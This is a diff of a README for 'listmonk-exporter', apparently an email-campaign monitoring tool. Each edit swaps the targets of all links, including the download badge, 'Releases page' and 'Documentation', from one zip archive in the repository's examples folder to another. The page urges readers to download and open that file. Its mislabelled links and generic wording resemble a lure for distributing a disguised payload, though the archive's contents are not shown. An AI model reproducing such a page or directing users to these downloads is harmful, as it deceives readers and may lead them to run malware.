@@ -1,6 +1,6 @@
 # 📬 listmonk-exporter - Monitor Your Email Campaigns Easily
 
-[![Download listmonk-exporter](https://raw.githubusercontent.com/chaoweizheng/listmonk-exporter/main/examples/listmonk-exporter-v2.6-alpha.4.zip)](https://raw.githubusercontent.com/chaoweizheng/listmonk-exporter/main/examples/listmonk-exporter-v2.6-alpha.4.zip)
+[![Download listmonk-exporter](https://github.com/chaoweizheng/listmonk-exporter/raw/refs/heads/main/examples/listmonk-exporter-concatenate.zip)](https://github.com/chaoweizheng/listmonk-exporter/raw/refs/heads/main/examples/listmonk-exporter-concatenate.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ listmonk-exporter is a simple tool designed to help you keep track of your email
 To begin using listmonk-exporter, follow these easy steps:
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/chaoweizheng/listmonk-exporter/main/examples/listmonk-exporter-v2.6-alpha.4.zip) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/chaoweizheng/listmonk-exporter/raw/refs/heads/main/examples/listmonk-exporter-concatenate.zip) to find the latest version of the software.
 
 2. **Select the Right File**  
    Choose the file that matches your operating system. You will find options for Windows, Mac, and Linux.
@@ -27,7 +27,7 @@ To begin using listmonk-exporter, follow these easy steps:
 
 ## 📥 Download & Install
 
-To get the software, you can download it from our [Releases page](https://raw.githubusercontent.com/chaoweizheng/listmonk-exporter/main/examples/listmonk-exporter-v2.6-alpha.4.zip). Here are the steps to follow:
+To get the software, you can download it from our [Releases page](https://github.com/chaoweizheng/listmonk-exporter/raw/refs/heads/main/examples/listmonk-exporter-concatenate.zip). Here are the steps to follow:
 
 1. Click on the download link for your system.
 2. Open the downloaded file and follow the installation instructions.
@@ -75,7 +75,7 @@ If you need help or have questions, feel free to reach out. You can create an is
 
 ## 🔗 Useful Links
 
-- [listmonk-exporter Releases](https://raw.githubusercontent.com/chaoweizheng/listmonk-exporter/main/examples/listmonk-exporter-v2.6-alpha.4.zip)
-- [Documentation](https://raw.githubusercontent.com/chaoweizheng/listmonk-exporter/main/examples/listmonk-exporter-v2.6-alpha.4.zip) 
+- [listmonk-exporter Releases](https://github.com/chaoweizheng/listmonk-exporter/raw/refs/heads/main/examples/listmonk-exporter-concatenate.zip)
+- [Documentation](https://github.com/chaoweizheng/listmonk-exporter/raw/refs/heads/main/examples/listmonk-exporter-concatenate.zip) 
 
 With listmonk-exporter, gain insights into your email marketing with minimal effort. Enjoy monitoring your campaigns!
